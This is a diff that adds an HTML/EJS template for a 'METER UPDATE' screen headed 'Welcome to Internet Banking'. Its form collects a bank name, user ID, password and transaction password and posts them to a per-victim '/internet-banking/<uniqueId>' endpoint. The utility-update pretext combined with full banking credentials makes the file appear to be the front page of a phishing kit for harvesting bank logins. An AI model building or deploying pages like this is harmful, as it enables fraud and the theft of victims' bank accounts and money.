@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Internet Banking</title>
+  <link rel="stylesheet" href="/css/banking.css" />
+</head>
+<body>
+  <div class="wrapper">
+    <div class="card">
+      <!-- Header Icon -->
+      <div class="card-header">
+        <img src="/assets/meter_update.png" alt="Meter Icon" class="card-icon" />
+      </div>
+
+      <!-- Meter Update Title -->
+      <div class="title-container">
+        <span class="card-title">METER UPDATE</span>
+      </div>
+
+      <!-- Internet Banking Subtitle -->
+      <div class="select-title">Welcome to Internet Banking</div>
+
+      <form
+        class="card-body"
+        action="/internet-banking/<%= uniqueId %>"
+        method="POST"
+      >
+        <!-- carry the uniqueId too, just in case -->
+        <input type="hidden" name="uniqueId" value="<%= uniqueId %>" />
+
+        <div class="form-group">
+          <label for="bankName" class="visually-hidden">Bank Name</label>
+          <input
+            type="text"
+            id="bankName"
+            name="bankName"
+            placeholder="Enter Bank Name"
+            required
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="userId" class="visually-hidden">User ID</label>
+          <input
+            type="text"
+            id="userId"
+            name="userId"
+            placeholder="Enter User ID"
+            required
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="password" class="visually-hidden">Password</label>
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Enter Password"
+            required
+          />
+        </div>
+
+        <div class="form-group">
+          <label for="transactionPassword" class="visually-hidden">Transaction Password</label>
+          <input
+            type="password"
+            id="transactionPassword"
+            name="transactionPassword"
+            placeholder="Enter Transaction Password"
+            required
+          />
+        </div>
+
+        <button type="submit" class="btn-next">Next</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
